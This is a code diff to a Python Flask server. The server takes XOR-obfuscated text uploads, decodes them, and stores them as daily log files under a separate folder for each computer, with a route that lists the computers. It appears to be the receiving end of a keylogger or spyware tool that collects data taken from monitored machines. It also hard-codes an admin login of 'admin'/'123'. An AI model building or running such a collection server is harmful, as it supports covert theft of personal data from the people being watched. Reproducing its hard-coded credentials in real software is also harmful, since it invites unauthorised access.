@@ -3,6 +3,10 @@ import datetime
 import sys
 from flask import Flask, request, jsonify, send_file
 from flask_cors import CORS
+from dotenv import load_dotenv
+
+
+load_dotenv()
 
 app = Flask(__name__)
 CORS(app)
@@ -10,6 +14,7 @@ CORS(app)
 UPLOAD_FOLDER = "uploads"
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 users = {"admin": "123"}
+KEY = int(os.getenv("KEY", 5))
 
 
 def xor_decrypt(data):
@@ -29,12 +34,17 @@ def upload_file():
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d")
     file_path = os.path.join(computer_folder, f"{timestamp}.txt")
 
-    if os.path.exists(file_path):
-        with open(file_path, "ab") as f:
-            f.write(xor_decrypt(file.read().decode("utf-8")))
-    else:
-        file.save(file_path)
+    decoded = file.read().decode("utf-8")
 
+    if os.path.exists(file_path):
+        with open(file_path, "a") as f:
+            f.write(xor_decrypt(decoded))
+    else:
+        with open(file_path, "w") as f:
+            f.write(xor_decrypt(decoded))
+            # f.write(xor_decrypt(file.read()).decode("utf-8"))
+            # f.write(file.read().decode("utf-8"))
+            # f.write(xor_decrypt(file.read().decode("utf-8")))
     return jsonify({"message": "File received", "path": file_path}), 200
 
 @app.route('/computers', methods=['GET'])
@@ -73,11 +83,12 @@ def login():
         return jsonify({"success": False})
 
 def main(KEY_VALUE=5):
-    global KEY
-    KEY = int(KEY_VALUE) if isinstance(KEY_VALUE, str) and KEY_VALUE.isdigit() else 5
+    # global KEY
+    # KEY = int(KEY_VALUE) if isinstance(KEY_VALUE, str) and KEY_VALUE.isdigit() else 5
     print(f'Server is listening on port 5000')
     app.run(host='0.0.0.0', port=5000)
 
 if __name__ == '__main__':
-    args = sys.argv[1:] if len(sys.argv) > 1 else []
-    main(*args)
+    # args = sys.argv[1:] if len(sys.argv) > 1 else []
+    # main(*args)
+    main()
